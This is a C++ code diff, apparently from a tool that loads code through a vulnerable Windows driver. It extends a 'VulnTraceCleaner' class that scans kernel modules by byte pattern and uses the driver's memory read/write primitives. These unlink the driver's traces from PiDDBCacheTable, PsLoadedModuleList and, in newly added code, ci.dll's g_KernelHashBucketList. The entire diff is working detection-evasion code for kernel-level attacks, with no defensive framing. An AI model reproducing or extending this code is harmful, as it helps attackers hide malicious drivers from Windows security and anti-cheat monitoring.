@@ -10,7 +10,7 @@
 
 VulnTraceCleaner::VulnTraceCleaner(std::shared_ptr<K32Context> k32ctx, std::shared_ptr<K32Module> k32Module)
     : k32ctx(std::move(k32ctx))
-    , k32ModuleParser(std::make_unique<K32ModuleParser>(this->k32ctx->GetDriver(), std::move(k32Module)))
+    , k32Module(std::move(k32Module))
 {
 }
 
@@ -31,12 +31,17 @@ bool VulnTraceCleaner::Cleanup() const
         return false;
     }
 
+    if (!CleanupKernelHashBucketList()) {
+        spdlog::error("Failed to cleanup vulnerable driver from g_KernelHashBucketList");
+        return false;
+    }
+
     return true;
 }
 
 bool VulnTraceCleaner::CleanupPiDDBCacheList() const
 {
-    static const auto _PiDDBCacheList = k32ModuleParser->FindAbsoluteAddr(
+    static const auto _PiDDBCacheList = k32Module->GetModuleParser().FindAbsoluteAddr(
         "\x48\x8D\x15\x00\x00\x00\x00\x48\x8B\x0D\x00\x00\x00\x00\x00\x00\x00\x74",
         "xxx????xxx???????x", 3, 7);
 
@@ -82,7 +87,7 @@ bool VulnTraceCleaner::CleanupPiDDBCacheList() const
 
 bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
 {
-    static const auto _PiDDBCacheTable = k32ModuleParser->FindAbsoluteAddr(
+    static const auto _PiDDBCacheTable = k32Module->GetModuleParser().FindAbsoluteAddr(
         "\x48\x8D\x0D\x00\x00\x00\x00\x45\x33\xF6\x48\x89\x44\x24",
         "xxx????xxxxxxx", 3, 7);
 
@@ -119,7 +124,7 @@ bool VulnTraceCleaner::CleanupPiDDBCacheTable() const
 
 bool VulnTraceCleaner::CleanupPsLoadedModuleList() const
 {
-    static const auto _PsLoadedModuleList = k32ModuleParser->FindAbsoluteAddr(
+    static const auto _PsLoadedModuleList = k32Module->GetModuleParser().FindAbsoluteAddr(
         "\x48\x8B\x1D\x00\x00\x00\x00\x45\x33\xFF\x41\x8B\xF0",
         "xxx????xxxxxx", 3, 7);
 
@@ -156,4 +161,70 @@ bool VulnTraceCleaner::CleanupPsLoadedModuleList() const
     }
 
     return false;
+}
+
+bool VulnTraceCleaner::CleanupKernelHashBucketList() const
+{
+    static K32Module ci(k32ctx->GetDriver(), "ci.dll");
+    static const auto _g_KernelHashBucketList = ci.GetModuleParser().FindAbsoluteAddr(
+        "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x00\x00\x00\x00\x00\x75\x00\x48\x8B\x0D\x00\x00\x00\x00\x48\x8D\x53\x00\x45\x33\xC0",
+        "xxx????x?xx?????x?xxx????xxx?xxx", 3, 7);
+
+    if (!_g_KernelHashBucketList) {
+        spdlog::error("_g_KernelHashBucketList not found");
+        return false;
+    }
+
+    struct HashBucketEntry {
+        HashBucketEntry* Next;
+        UNICODE_STRING DriverName;
+    };
+
+    uintptr_t current = 0;
+    if (!k32ctx->GetDriver().ReadMemory(_g_KernelHashBucketList, &current, sizeof(current))) {
+        spdlog::error("Failed to read head of g_KernelHashBucketList");
+        return false;
+    }
+
+    if (!current) {
+        return true;
+    }
+
+    const auto& driverName = k32ctx->GetDriver().GetName();
+    uintptr_t prev = _g_KernelHashBucketList;
+
+    while (current) {
+        HashBucketEntry entry { };
+        if (!k32ctx->GetDriver().ReadMemory(current, &entry, sizeof(entry))) {
+            spdlog::error("Failed to read entry at 0x{:X}", current);
+            break;
+        }
+
+        uintptr_t next = reinterpret_cast<uintptr_t>(entry.Next);
+
+        wchar_t nameBuf[512] { };
+        USHORT nameLen = min(entry.DriverName.Length, USHORT(sizeof(nameBuf) - sizeof(wchar_t)));
+
+        if (entry.DriverName.Buffer && nameLen > 0) {
+            k32ctx->GetDriver().ReadMemory(reinterpret_cast<uintptr_t>(entry.DriverName.Buffer), nameBuf, nameLen);
+            nameBuf[nameLen / sizeof(wchar_t)] = L'\0';
+        }
+
+        std::string nameStr(nameBuf, nameBuf + nameLen / sizeof(wchar_t));
+
+        if (nameStr.ends_with(driverName)) {
+            if (!k32ctx->GetDriver().WriteMemory(prev, &next, sizeof(next))) {
+                spdlog::error("Failed to remove entry at 0x{:X}", current);
+                return false;
+            }
+
+            current = next;
+            continue;
+        }
+
+        prev = current;
+        current = next;
+    }
+
+    return true;
 }
